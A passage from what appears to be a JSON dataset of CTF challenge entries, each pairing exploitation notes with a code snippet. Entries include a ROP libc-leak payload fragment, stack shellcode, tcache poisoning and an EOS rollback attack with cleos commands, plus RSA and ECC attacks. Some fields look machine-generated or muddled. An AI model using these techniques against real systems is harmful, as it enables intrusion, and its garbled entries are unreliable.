        "knowledge": [
            "When facing a challenge involving elliptic curves with a non-standard curve equation and unknown parameters, analyzing the associative and commutative properties of the elliptic curve's addition law can lead to relationships between known points on the curve. This approach helps in deducing the curve's modulus \\(p\\) by setting up equations based on the given point additions (\\(P + Q\\), \\(Q + Q\\), \\(P + P\\)), and then computing the greatest common divisor (gcd) of derived expressions to find a multiple of \\(p\\).",
            "In challenges where the flag is embedded within coordinates of points on an elliptic curve, one can recover these coordinates by first deducing the curve's modulus \\(p\\), then exploiting specific relationships between the points and the modulus to compute potential coordinates. This involves determining the quotient \\(\\frac{a}{b}\\) from the curve's defining equation, and using square roots modulo \\(p\\) to solve for the coordinates. Special attention should be given to the fact that \\(p\\) is a prime congruent to 3 mod 4, which simplifies computation of square roots modulo \\(p\\)."
        ],
        "key": "```python  \n#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *  \nfrom secret import a, b, p, P, Q  \nfrom flag import flag\n\ndef onmiff(a, b, p, G):  \n   x, y = G  \n   return (a*x*(y**2 - 1) - b*y*(x**2 - 1)) % p == 0\n\ndef addmiff(X, Y):  \n   x_1, y_1 = X  \n   x_2, y_2 = Y  \n   x_3 = (x_1 + x_2) * (1 + y_1*y_2) * inverse((1 + x_1*x_2) * (1 - y_1*y_2),\np) % p  \n   y_3 = (y_1 + y_2) * (1 + x_1*x_2) * inverse((1 + y_1*y_2) * (1 - x_1*x_2),\np) % p  \n   return (x_3, y_3)\n\nl = len(flag) // 2  \nm1, m2 = bytes_to_long(flag[:l]), bytes_to_long(flag[l:])\n\nassert m1 < (p // 2) and m2 < (p // 2)  \nassert onmiff(a, b, p, P) and onmiff(a, b, p, Q)  \nassert P[0] == m1 and Q[0] == m2\n\nprint(f'P + Q = {addmiff(P, Q)}')  \nprint(f'Q + Q = {addmiff(Q, Q)}')  \nprint(f'P + P = {addmiff(P, P)}')  \n```"
    },
    {
        "name": "doubletrouble",
        "write_up": "dataset/raw/doubletrouble.md",
        "type": "pwn",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 200,
        "max_score": 1285,
        "difficulty": 0.1556420233463035,
        "knowledge": [
            "In scenarios involving exploitation of a program that interacts with input as floating-point numbers, an attacker can manipulate the program's memory layout, specifically targeting stack buffers for arbitrary code execution. This can be achieved by carefully crafting input sequences that extend array boundaries and overwrite critical memory segments, such as the return address, while ensuring that the input values comply with the floating-point format, thereby executing shellcode stored on the stack.",
            "To bypass stack canaries in binary exploitation challenges where the application's memory layout includes stack canaries for security, an approach can be to maintain the canary's integrity by sorting input values such that the canary remains undisturbed. This requires an understanding of the underlying binary format for floating-point numbers and how they are organized in memory to ensure that during the exploit, the values injected do not trigger stack canary checks. This technique may involve the strategic placement of shellcode and manipulation of the stack to control the flow of execution without directly overwriting the canary.\n\nA specific sample of payload or direct extraction to a universal format is not feasible due to the detailed nature and complexity of the described exploitation method. The methodology involves intricate manipulation of floating-point numbers and memory layout which cannot be succinctly captured in a single payload example."
        ],
        "key": "```c\nint findArray(int *size, double *stack_buffer, double lower_bound, double upper_bound)  \n{  \n int idx = *size;  \n while ( *size < 2 * idx )  \n {  \n   if ( stack_buffer[*size - idx] > lower_bound && upper_bound > stack_buffer[*size - idx] )  \n     return *size - idx;  \n   (*size)++;  \n }  \n *size = idx;  \n return 0;  \n}\n```"
    },
    {
        "name": "dreams",
        "write_up": "dataset/raw/dreams.md",
        "type": "pwn",
        "competition": [
            "angstrom/2022",
            "https://ctftime.org/event/1588/tasks/"
        ],
        "score": 210,
        "max_score": 250,
        "difficulty": 0.84,
        "knowledge": [
            "For heap exploitation challenges, altering global variables related to program functionality can enable the allocation of a large number of chunks. This can be particularly useful for facilitating arbitrary write operations or for crafting fake chunks when combined with a heap leak. This approach requires knowing the address of the global variable and having a mechanism (like a write-what-where condition) to modify its value. An example of altering a global variable to affect heap behavior involves setting a large value to a variable that controls the maximum number of allowable dynamic allocations, effectively bypassing allocation size restrictions.",
            "A heap leak can be utilized to bypass security mechanisms and facilitate arbitrary memory write operations using tcache poisoning. Once a heap address is leaked, it's possible to calculate the base address of the heap and manipulate heap metadata to perform arbitrary writes. This can be achieved by freeing chunks in a specific order to poison the tcache list, followed by reallocating chunks to overwrite pointers or metadata such as size fields of subsequent chunks. This strategy is particularly effective in heap exploitation challenges where direct memory overwrites are restricted or where the layout of the heap is initially unknown."
        ],
        "key": "```c\nvoid gosleep(void)\n{\n size_t sVar1;\n long in_FS_OFFSET;\n int local_1c;\n char *local_18;\n long local_10;\n \n local_10 = *(long *)(in_FS_OFFSET + 0x28);\n puts(\"3 doses of Ambien finally calms you down enough to sleep.\");\n puts(\"Toss and turn all you want, your unconscious never loses its grip.\");\n printf(\"In which page of your mind do you keep this dream? \");\n local_1c = 0;\n __isoc99_scanf(&DAT_00402104,&local_1c);\n getchar();\n if (((local_1c < MAX_DREAMS) && (-1 < local_1c)) && (*(long *)(dreams + (long)local_1c * 8) == 0))\n {\n   local_18 = (char *)malloc(0x1c);\n   printf(\"What\\'s the date (mm/dd/yy))? \");\n   read(0,local_18,8);\n   sVar1 = strcspn(local_18,\"\\n\");\n   local_18[sVar1] = '\\0';\n   printf(\"On %s, what did you dream about? \",local_18);\n   read(0,local_18 + 8,0x14);\n   *(char **)((long)local_1c * 8 + dreams) = local_18;\n   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                   /* WARNING: Subroutine does not return */\n     __stack_chk_fail();\n   }\n   return;\n }\n puts(\"Invalid index!\");\n                   /* WARNING: Subroutine does not return */\n exit(1);\n}\n\nvoid psychiatrist(void)\n{\n long in_FS_OFFSET;\n int local_14;\n long local_10;\n \n local_10 = *(long *)(in_FS_OFFSET + 0x28);\n puts(\"Due to your HMO plan, you can only consult me to decipher your dream.\");\n printf(\"What dream is giving you trouble? \");\n local_14 = 0;\n __isoc99_scanf(&DAT_00402104,&local_14);\n getchar();\n if (*(long *)(dreams + (long)local_14 * 8) == 0) {\n   puts(\"Invalid dream!\");\n                   /* WARNING: Subroutine does not return */\n   exit(1);\n }\n printf(\"Hmm... I see. It looks like your dream is telling you that \");\n puts((char *)(*(long *)(dreams + (long)local_14 * 8) + 8));\n puts(\n     \"Due to the elusive nature of dreams, you now must dream it on a different day. Sorry, I don\\'t make the rules. Or do I?\"\n     );\n printf(\"New date: \");\n read(0,*(void **)(dreams + (long)local_14 * 8),8);\n if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                   /* WARNING: Subroutine does not return */\n   __stack_chk_fail();\n }\n return;\n}\n\nvoid sell(void)\n{\n long in_FS_OFFSET;\n int local_14;\n long local_10;\n \n local_10 = *(long *)(in_FS_OFFSET + 0x28);\n puts(\"You\\'ve come to sell your dreams.\");\n printf(\"Which one are you trading in? \");\n local_14 = 0;\n __isoc99_scanf(&DAT_00402104,&local_14);\n getchar();\n if ((local_14 < MAX_DREAMS) && (-1 < local_14)) {\n   puts(\"You let it go. Suddenly you feel less burdened... less restrained... freed. At last.\");\n   free(*(void **)(dreams + (long)local_14 * 8));\n   puts(\"Your money? Pfft. Get out of here.\");\n   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                   /* WARNING: Subroutine does not return */\n     __stack_chk_fail();\n   }\n   return;\n }\n puts(\"Out of bounds!\");\n                   /* WARNING: Subroutine does not return */\n exit(1);\n}\n```"
    },
    {
        "name": "dROPit",
        "write_up": "dataset/raw/dROPit.md",
        "type": "pwn",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 300,
        "max_score": 800,
        "difficulty": 0.375,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities in challenges where NX is enabled but PIE and canary checks are disabled, it is effective to leverage Return Oriented Programming (ROP) to bypass NX. The first step involves finding a `pop rdi; ret` gadget for controlling the contents of the RDI register (used for the first function argument in x86_64 calling conventions), followed by leaking a libc function address (e.g., `puts`) to calculate libc's base address. This method is applicable for leaking addresses to defeat ASLR and execute a second stage payload that may involve calling `execve(\"/bin/sh\", NULL, NULL)`.\n    - Example payload segment: \n    ```\n    payload = 'A' * buffer_overflow_offset\n    payload += p64(POP_RDI)  \n    payload += p64(PUTS_GOT)  \n    payload += p64(PUTS_PLT)  \n    payload += p64(MAIN)  \n    ```",
            "To accurately leak libc's base address for exploitation, one can utilize the Procedure Linkage Table (PLT) and Global Offset Table (GOT) entries of already imported functions (such as `puts`) to leak their real addresses at runtime. This leaked address can then be used with tools or databases like https://libc.rip to identify the exact libc version and calculate the base address of libc. With libc's base discovered, an attacker can reliably call any libc function, including `system()`, to achieve remote code execution.\n    - An approach to utilize these addresses involves crafting a ROP chain that (1) set the first argument (RDI) with the address of a GOT entry (e.g., `puts@got`) to be leaked by calling a corresponding PLT entry (e.g., `puts@plt`), and (2) returns to `main` or another location that reads user input to permit a second payload execution with the now-known libc base address."
        ],
        "key": "```c\n#include <stdio.h>\n\nint main() {\n    char buffer[48];\n    fgets(buffer, 100, stdin);\n    return 0;\n}\n```"
    },
    {
        "name": "Duality",
        "write_up": "dataset/raw/Duality.md",
        "type": "crypto",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 453,
        "max_score": 500,
        "difficulty": 0.906,
        "knowledge": [
            "For challenges involving prime numbers and arithmetic combinations like $a_{i}p+b_{i}$, one effective approach to solving is to use the approximate greatest common divisor (AGCD) technique. This process involves obtaining several samples that follow the form $a_{i}p+b_{i}$ and using combinations of these samples to probabilitically recover the prime number $p$. This method is particularly useful when dealing with a relatively small number of samples that are generated by a process that includes prime numbers in their structure.",
            "When dealing with Linear Feedback Shift Registers (LFSRs) combined with Linear Congruential Generators (LCGs) as part of a Pseudo-Random Number Generator (PRNG), and the task is to recover the initial seed, one can exploit the characteristics of the LFSR's behavior. Specifically, if the LCG component is significantly biased or shows predictable output, the PRNG's sequence might be simplified to primarily LFSR behavior, simplifying the seed recovery process. Information Set Decoding (ISD) can be applied for key recovery by solving an instance of the low-density parity-check (LDPC) problem which is faster than brute-force or more complex algebraic methods when the error rate is low and the number of samples is limited.\n\nExample payload snippet to utilize LFSR behavior for seed recovery:\n```python\nclass symLFSR:  \n   def __init__(self, seed):  \n       self.state = list(seed)  \n       self.taps = [0, 16, 32, 64, 96, 127]\n\n   def get(self):  \n       next_bit = 0  \n       for tap in self.taps:  \n           next_bit += self.state[tap]  \n       self.state = self.state[1:] + [next_bit]  \n       return next_bit\n```"
        ],
        "key": "```python\nclass symLFSR:  \n   def __init__(self, seed):  \n       self.state = list(seed)  \n       self.taps = [0, 16, 32, 64, 96, 127]\n\n   def get(self):  \n       next_bit = 0  \n       for tap in self.taps:  \n           next_bit += self.state[tap]  \n       self.state = self.state[1:] + [next_bit]  \n       return next_bit\n```"
    },
    {
        "name": "Dungeon Escape",
        "write_up": "dataset/raw/Dungeon Escape.md",
        "type": "pwn",
        "competition": [
            "FireShell/2020",
            "https://ctftime.org/event/944/tasks/"
        ],
        "score": 472,
        "max_score": 500,
        "difficulty": 0.944,
        "knowledge": [
            "When solving problems involving finding the shortest paths in graphs with vertices representing states and edges representing possible transitions where conditions apply (like doors opening at certain times), Dijkstra's algorithm can be modified to accommodate these conditions. Specifically, when you reach a vertex at time $x$ and the edge (or door) opens at an interval $t$, adjust the time to wait for the door to open by using the formula $\\left\\lceil \\frac{x}{t} \\right\\rceil t$, which calculates the next opening time that is greater than or equal to $x$.",
            "To automate interaction with servers for challenges requiring real-time input and output processing, a combination of a compiled solver (for computational efficiency) and a scripting language like Python can be used. The scripting part can handle network communications, parse challenge inputs, feed them to the solver, and then read and send the solver's output back to the server. This approach is efficient for challenges that consist of multiple rounds or require dynamic input/output handling.\n\nExample Python script snippet for server interaction:\n```python\nfrom pwn import *\n\nr = remote('example.com', 12345)  \nr.sendlineafter('prompt: ', 'command')\n\n# Read challenge input from the server\ninput_data = r.recvuntil('Input end signal').decode()\n\n# Assume the solver is a separate executable\nsol = process('./solver')\nsol.send(input_data)  # Send the challenge input to the solver\n\n# Get the solver's output and send it back to the server\noutput_data = sol.recvline()\nr.send(output_data)  \n\nresult = r.recvline().decode()\nif 'Correct' in result:  \n    print('Solution accepted')\nelse:  \n    print('Solution rejected')\n```"
        ],
        "key": "```c++\n#include <bits/stdc++.h>\n\nusing namespace std;\n\ntypedef pair<int, int> pii;\n\nint n, m;  \nvector<int> intervals;  \nvector<vector<pii>> edges;\n\nint get_open_time(int time, int open_time) {  \n   if(time == 0) return 0;  \n   return ((time - 1) / open_time + 1) * open_time;  \n}\n\nint solve(int start_node, int end_node) {  \n   priority_queue<pii, vector<pii>, greater<pii>> Q;  \n   vector<bool> visited(n + 1);\n\n   Q.emplace(0, start_node);  \n   while(Q.top().second != end_node) {  \n       int dist = Q.top().first, node = Q.top().second;  \n       Q.pop();  \n       if(!visited[node])  \n           for(pii &edge : edges[node])  \n               Q.emplace(get_open_time(dist + edge.second, intervals[edge.first]), edge.first);  \n       visited[node] = true;  \n   }  \n   return Q.top().first;  \n}\n\nint main() {  \n   cin >> n >> m;\n\n   intervals.resize(n + 1);  \n   for(int i = 1; i <= n; i++)  \n       cin >> intervals[i];\n\n   edges.resize(n + 1);  \n   for(int i = 1; i <= m; i++) {  \n       int u, v, w;  \n       cin >> u >> v >> w;  \n       edges[u].emplace_back(v, w);  \n       edges[v].emplace_back(u, w);  \n   }\n\n   int start_node, end_node;  \n   cin >> start_node >> end_node;  \n   cout << solve(start_node, end_node) << '\\n';\n\n   return 0;  \n}  \n```"
    },
    {
        "name": "dyrpto",
        "write_up": "dataset/raw/dyrpto.md",
        "type": "crypto",
        "competition": [
            "PlaidCTF/2020",
            "https://ctftime.org/event/936/tasks/"
        ],
        "score": 250,
        "max_score": 550,
        "difficulty": 0.45454545454545453,
        "knowledge": [
            "When facing RSA encryption with a short padding scheme, consider using Coppersmith's short pad attack, especially if the scenario includes manipulating minor details like serial numbers or incrementing IDs affecting the plaintext. This method is applicable when the difference between plaintexts is tiny but known, and the padding added to the message is insufficiently secure (less than the key size). The approach involves constructing a polynomial equation reflecting the difference between the encrypted messages and solving for the roots to reveal this difference, thereby compromising the encryption. \n\n   - Example of constructing polynomial equations for the attack: \n     ```python\n     PRxy.<x,y> = PolynomialRing(Zmod(N))\n     g1 = x ** e - ct1\n     g2 = (x + y + (1 << (2152 + 192))) ** e - ct2\n     ```",
            "For scenarios where two plaintexts encrypted under the same RSA key are closely related, the Franklin-Reiter related message attack can be applied to recover these plaintexts. This attack technique is especially useful when there's a known relation or difference between two messages, such as a fixed offset. The strategy involves using the relation between these messages to construct corresponding polynomial equations and finding their greatest common divisor (GCD), which will often yield the original messages.\n\n   - Example of recovering plaintext using Franklin-Reiter related message attack:\n     ```python\n     x = PRx.gen()\n     g1 = (x + (1 << (2152 + 192))) ** e - ct1\n     g2 = (x + diff) ** e - ct2\n\n     # gcd  \n     while g2:  \n        g1, g2 = g2, g1 % g2\n\n     g = g1.monic()\n     assert g.degree() == 1\n\n     msg = -g[0]\n     ```"
        ],
        "key": "```python\ng1 = (x + (1 << (2152 + 192))) ** e - ct1  \ng2 = (x + diff) ** e - ct2\n\n# gcd  \nwhile g2:  \n   g1, g2 = g2, g1 % g2\n\ng = g1.monic()  \nassert g.degree() == 1\n\nmsg = -g[0]  \nflag = l2b(msg)  \nprint(flag)  \n```"
    },
    {
        "name": "e",
        "write_up": "dataset/raw/e.md",
        "type": "misc",
        "competition": [
            "0CTF/2023",
            "https://ctftime.org/event/2073/tasks/"
        ],
        "score": -1.0,
        "max_score": 664,
        "difficulty": -1,
        "knowledge": [
            "When solving integer overflow challenges involving type casting, input values can be precisely crafted to exploit the overflow. Specifically, for a 16-bit data type casting scenario, if an input is stored as a `float` and then cast to an `unsigned short`, providing an input value that overflows the `unsigned short` range and wraps around to the target value can be a successful strategy. For instance, inputting `65538` exploits the overflow to wrap around and effectively become `2` since `65538` overflows the `unsigned short` max value (`0xFFFF` or `65535`) by `3`, resetting to `2`. Example payload: `65538`.",
            "In challenges involving floating-point precision issues, providing an input that compensates for the floating-point imprecision can lead to bypassing equality checks. When the task is to adjust a sum to a precise value (like making the total exactly `1.0` when added to `0.9`), consider floating-point representation inaccuracies. For example, instead of adding `0.1` to `0.9`, which due to floating-point arithmetic could result in a value slightly over `1.0`, providing an input slightly less than the mathematically exact amount needed (like `0.0999999`) can exactly achieve the desired total due to the way floating-point numbers are represented in computers. Example payload: `0.0999999`.",
            "For challenges involving operations with arrays and randomness where the objective is to manipulate the sum of the array elements, using extreme values can be an effective method to counteract unknowns introduced by random values. If the challenge is structured such that after user input, random float values within a defined range are added to an array, and the goal is to make the final sum zero, inputting a large positive value followed by a large enough negative value to counterbalance both the initial large positive value and the sum of random values can manipulate the total sum effectively back to zero. This strategy exploits the limited impact of relatively small random values against significantly large user-provided inputs. Example payload: Initial input: `30000000000`, Final input: `-30000000000`."
        ],
        "key": "```c++\nbool flow_start() {\n\n\t// Get user input  \n\tfloat a = get_user_input(\"Number that is equal to two: \");\n\n\t// Can't be two  \n\tif (a <= 2)  \n\t\treturn false;\n\n\t// Check if equal to 2  \n\treturn (unsigned short)a == 2;  \n}  \n\nbool round_2() {\n\n\tfloat total = 0;\n\n\t// Sum these numbers to 0.9  \n\tfor (int i = 0; i < 9; i++)  \n\t\ttotal += 0.1;\n\n\t// Add user input  \n\ttotal += get_user_input(\"Number to add to 0.9 to make 1: \");\n\n\t// Check if equal to one  \n\treturn total == 1.0;  \n}  \n\nbool level_3() {\n\n\tfloat total = 0;\n\n\tunsigned int *seed;  \n\tvector<float> n_arr;\n\n\t// Random seed  \n\tseed = (unsigned int *)getauxval(AT_RANDOM);  \n\tsrand(*seed);\n\n\t// Add user input  \n\tadd_user_input(&n_arr, \"Number to add to array to equal zero: \");\n\n\t// Add many random integers  \n\tfor (int i = 0; i < 1024 * (8 + rand() % 1024); i++)  \n\t\tn_arr.push_back((rand() % 1024) + 1);\n\n\t// Add user input  \n\tadd_user_input(&n_arr, \"Number to add to array to equal zero: \");\n\n\t// Get sum  \n\tfor (int i = 0; i < n_arr.size(); i++)  \n\t\ttotal += n_arr[i];\n\n\t// Check if equal to zero  \n\treturn total == 0;  \n}  \n```"
    },
    {
        "name": "EaCy",
        "write_up": "dataset/raw/EaCy.md",
        "type": "crypto",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 979,
        "max_score": 1000,
        "difficulty": 0.979,
        "knowledge": [
            "For RSA encryption schemes based on univariate polynomials over a finite field (Zp), finding the multiplicative order of the group formed by residue polynomials of a given modulus is crucial. This can be achieved by factorizing the modulus into its irreducible polynomials, determining their degrees, and applying the specific formula \\(s = (p^{d1} - 1) \\times (p^{d2} - 1)\\), where \\(d1\\) and \\(d2\\) are the degrees of the irreducible polynomials, and \\(p\\) is a prime number. This method allows for the inversion of the encryption exponent \\(e\\) and decryption of the ciphertext polynomial to reveal the message.",
            "In challenges involving the discrete logarithm problem in the context of polynomials over finite fields (Zp[x]), if the modulus polynomial factors into small-order groups, the Pohlig-Hellman algorithm can be effectively used. This approach involves factorizing the order of the group into small primes and solving the discrete logarithm modulo each prime factor, then combining these results using the Chinese Remainder Theorem (CRT). To ensure effectiveness, select primes for which the base element does not give the identity element when raised to the order divided by the prime power. This technique is especially useful when the discrete logarithm's factors include many small primes and the solution domain is within bruteforceable range."
        ],
        "key": "```python  \ndef signMessage():  \n   print(\"\"\"  \n   Sign Message Service - courtsy of bakflip&sons  \n   \"\"\")  \n   message = input(\"Enter a message to sign: \").encode()  \n   if message == b'please_give_me_the_flag':  \n       print(\"\\n\\t:Coughs: This ain't that easy as Verifier1\")  \n       sys.exit()  \n\tsecret_mask = int(input(\"Now insert a really stupid value here: \"))  \n\tsecret = secret_multiplier ^ secret_mask  \n   signingKey = SigningKey.from_secret_exponent(secret)  \n   signature = signingKey.sign(message)  \n   print(\"Signature: \", hexlify(signature).decode())\n\ndef getFlag():  \n   print(\"\"\"  \n   BeetleBountyProgram - by bakflip&sons\n\n       Wanted! Patched or Alive- $200,000  \n       Submit a valid signature for 'please_give_me_the_flag' and claim the flag  \n   \"\"\")  \n   signingKey = SigningKey.from_secret_exponent(secret_multiplier)  \n   verifyingKey = signingKey.verifying_key  \n   try:  \n       signature = unhexlify(input(\"Forged Signature: \"))  \n       if verifyingKey.verify(signature, b'please_give_me_the_flag'):  \n           print(flag)  \n   except:  \n       print(\"Phew! that was close\")  \n```\n\n```python  \nsecret_multiplier = random.getrandbits(101)  \n```"
    },
    {
        "name": "EAR Piercing",
        "write_up": "dataset/raw/EAR Piercing.md",
        "type": "pwn",
        "competition": [
            "Sunshine/2020",
            "https://ctftime.org/event/992/tasks/"
        ],
        "score": 500,
        "max_score": 700,
        "difficulty": 0.7142857142857143,
        "knowledge": [
            "For challenges involving custom architectures and buffer overflow vulnerabilities, understanding the specific assembly instructions and manipulation required to exploit the architecture is crucial. This can include using unique instructions to influence control flow or manipulate memory directly. Exploit development can significantly benefit from a deep dive into the architecture's documentation and utilizing debuggers to inspect memory and control flow at runtime.",
            "In scenarios where the target architecture or environment employs non-standard mechanisms for data handling (e.g., string termination not by null bytes but by specific bit patterns), crafting payloads that adhere to these peculiarities is essential for successful exploitation. This may involve altering payload content dynamically based on how the architecture processes or modifies data in memory. An example payload adjustment could be altering a buffer underflow exploit to modify the virtual table's page permissions, enabling execution on normally non-executable pages through strategic input crafting, demonstrated by changing virtual page table permissions to execute shellcode stored on the stack."
        ],
        "key": "```assembly\n0180.0000: POP     {R3-R8, PC-DPC}\n...\n0191.0000: FCR     0xFF6C //read\n...\n014C.0000: RDB     ZERO, (0)\n014E.0000: POP     {PC-DPC}\n...\n010F.0000: ORR     R6, 0x80\n...\nFA80: 0000 0000 0000 0000 0000 E2E2 E2E2 E2E2\nFA90: E2E2 E2E2 E2E2 E2E2 E2E2 E2E2 E2E2 E2E2\n...\nFC00: 0000 0000 1200 1200 0000 0000 0000 0000\n...\n```\n"
    },
    {
        "name": "easter egg",
        "write_up": "dataset/raw/easter egg.md",
        "type": "web",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 25,
        "max_score": 1000,
        "difficulty": 0.025,
        "knowledge": [
            "When searching for hidden elements within the source code of a website, consider focusing on unique characters associated with the flag format (such as `{`, `}` for CTFs where the flag format is `fb{some_text_here}`). This can help narrow down the search area and uncover parts of the flag scattered across different sections of the site.",
            "To reconstruct a flag that is hidden in pieces throughout a website's source code, a Python script utilizing regular expressions can be employed. This script searches for and extracts characters or strings wrapped in specific HTML tags (e.g., `<span>`) and then concatenates them to form the complete flag. An example Python script for this scenario is:\n```python\nimport re\ntext = open(\"source_file.html\", 'r').read()\ntext = re.findall('''<span>(.)</span>''', text)\nprint(''.join(text))\n```"
        ],
        "key": "```html\n<span>f</span><span>b</span><span>{</span><span>w</span><span>e</span><span>'</span><span>r</span><span>e</span><span>_</span><span>h</span><span>i</span><span>r</span><span>i</span><span>n</span><span>g</span><span>}</span>\n```"
    },
    {
        "name": "easy as 123",
        "write_up": "dataset/raw/easy as 123.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "UMassCTF/2021",
            "https://ctftime.org/event/1282/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing network traffic in CTF challenges, especially with numerous packets, first filter out common traffic (like DNS, HTTPS, NTP, ARP, etc.) to narrow down potential leads. This step simplifies identifying suspicious or anomalous activities by reducing noise and focusing on non-standard ports or protocols, unusual packet sizes, or specific IP addresses.\n   - For Wireshark, use filters like `dns` to inspect domain queries, `not tcp.port == 443` to exclude HTTPS traffic, or `ip.addr==[target IP address]` to focus on traffic to or from a particular host.",
            "In scenarios involving encrypted payload analysis, if the encryption scheme involves a counter (CTR mode), and you identify a pattern in the counter use or a common starting sequence across different packets, you can exploit this by XORing the known plaintext with encrypted packets sharing the same counter value to derive the keystream. This derived keystream can then be used to decrypt other packets with the same counter value, potentially revealing hidden messages or commands.\n   - Example analysis process involves capturing payloads exhibiting a known command structure (e.g., `--help`, `getflg`) where a consistent counter byte is observed. Use the relationship `plaintext XOR ciphertext = keystream` on packets with a known plaintext to derive the keystream, which can then be applied to decrypt other encrypted messages using the same keystream by reversing the XOR process."
        ],
        "key": "```python\ndef process_packet(packet):\n    if packet.startswith(b'SM\\x92-'):\n        counter = packet[4]\n        command = packet[5:11]\n        payload = packet[11:]\n        if command == b'getflg':\n            return counter, payload\n    return None, None\n\ndef decrypt_payload(payload, keystream):\n    return bytes(a ^ b for a, b in zip(payload, keystream))\n\n# Example of a vulnerable function that processes packets\ndef vulnerable_packet_processing(packets):\n    keystream = None\n    for packet in packets:\n        counter, payload = process_packet(packet)\n        if counter == 0 and keystream is None:\n            # Assume we have a known plaintext attack to derive the keystream\n            known_plaintext = b\"'init' command will alter implant to initialize data exfiltration. cmd 'get[a-z][a-z][a-z]' to exfil. \"\n            keystream = [a ^ b for a, b in zip(known_plaintext, payload)]\n        elif counter == 0 and keystream is not None:\n            decrypted_payload = decrypt_payload(payload, keystream)\n            print(decrypted_payload)\n\n# Simulated packet data\npackets = [\n    b'SM\\x92-\\x00--help' + b'\\x00' * 128,\n    b'SM\\x92-\\x00getflg' + b'\\x00' * 128,\n    # More packets...\n]\n\nvulnerable_packet_processing(packets)\n```\n"
    },
    {
        "name": "Easy Crypto Challenge",
        "write_up": "dataset/raw/Easy Crypto Challenge.md",
        "type": "crypto",
        "competition": [
            "SpaceHeroes/2022",
            "https://ctftime.org/event/1567/tasks/"
        ],
        "score": 356,
        "max_score": 991,
        "difficulty": 0.35923309788092833,
        "knowledge": [
            "When faced with the task of decrypting a message encrypted using Elliptic Curve Cryptography (ECC) without access to a large, seemingly secure private key, one can successfully utilize the `discrete_log` function available in SageMath to find the small private key. This approach is particularly effective in cases where the private key is not large, leveraging ECC's vulnerability to smaller key sizes. \n   - Example payload (within a SageMath environment): \n     ``` python\n     d = G.discrete_log(P) # With G being the generator point, and P being the public key point.\n     ```",
            "To calculate the original message coordinates `(x3, y3)` from a given ciphertext in an ECC system, after obtaining the private key `d`, compute the discrete logarithm to obtain `(x2, y2)` by multiplying the private key `d` with the given point `(x1, y1)`. Then subtract this result from the ciphertext `C`, following the equation `C - (x2, y2) = (x3, y3)`, where `C` is the ciphertext and `(x2, y2)` is derived from the encryption process's intermediary step.\n   - Example payload: \n     ``` python\n     x2y2 = d * x1y1 # Calculating the intermediary encryption point.\n     x3y3 = C - x2y2 # Deriving the message coordinates.\n     ```"
        ],
        "key": "```python\n##INFO GIVEN & SET UP  \na = 3820149076078175358  \nb = 1296618846080155687  \nm = 11648516937377897327  #modulus  \nF = FiniteField(m) #points in elliptic curve are integers within field  \nE = EllipticCurve(F,[a,b]) #setting up curve function\n\nG = E(4612592634107804164, 6359529245154327104) #generator  \nP = E(9140537108692473465, 10130615023776320406) #public key\n\nx1y1 = E(7657281011886994152, 10408646581210897023) # (x1, y1) = k * G --- (eq 2)  \nC = E(5414448462522866853, 5822639685215517063) # C = (x3, y3) + (x2, y2) --- (eq 3)\n\n##FINDING PRIVATE KEY d  \nd = G.discrete_log(P) #such that P = d * G --- (eq 1)\n\n##FINDING MESSAGE: (x3, y3)  \nx2y2 = d * x1y1 # (x2, y2) = k * P = k * d * G = d * (x1, y1) --- (eq 4)  \nx3y3 = C - x2y2 # --- (eq 3)  \n  \nprint(\"x3:\" + str(x3y3[0]))  \nprint(\"y3:\" + str(x3y3[1]))  \n```"
    },
    {
        "name": "Easy EOS",
        "write_up": "dataset/raw/Easy EOS.md",
        "type": "misc",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 869,
        "max_score": 952,
        "difficulty": 0.9128151260504201,
        "knowledge": [
            "In EOS blockchain-based CTF challenges, if the challenge involves making predicative actions (like betting) where the outcome affects the participant's ability to continue, a *Roll Back* attack can be used. By deploying a smart contract that performs the action and checks the result in a single transaction, one can exploit the atomicity of transactions. If the action does not result in a desirable outcome, the transaction can be programmed to fail (throw an exception), which rolls back any changes made during the transaction. This ensures the participant's ability to attempt the action multiple times without being locked out due to a failure.  \n**Sample payload**:  \n```\ncleos set account permission [your_account] active '{\"threshold\": 1,\"keys\": [{\"key\": \"[your_key]\",\"weight\": 1}],\"accounts\":[{\"permission\":{\"actor\":\"[your_account]\",\"permission\":\"eosio.code\"},\"weight\":1}]}'\ncleos set contract [your_account] . -p [your_account]@active  \ncleos push action [your_account] makebet '[]' -p [your_account]@active  \n```",
            "In challenges involving pseudo-random number generation mechanisms, especially in blockchain contracts, it's possible to exploit predictable random number generation algorithms by decompiling the contract, understanding the algorithm, and predicting the outcome. Deploying your custom contract that can predict these numbers allows for manipulating the contract's actions. This technique requires understanding the blockchain's transaction model, decompilation skills for smart contracts, and the ability to write and deploy a contract that exploits the target contract's vulnerabilities.  \n**Sample payload**:  \n```\ncleos set account permission [your_account] active '{\"threshold\": 1,\"keys\": [{\"key\": \"[your_key]\",\"weight\": 1}],\"accounts\":[{\"permission\":{\"actor\":\"[your_account]\",\"permission\":\"eosio.code\"},\"weight\":1}]}'\ncleos set contract [your_account] . -p [your_account]@active  \ncleos push action [your_account] makebet '[]' -p [your_account]@active  \n```"
        ],
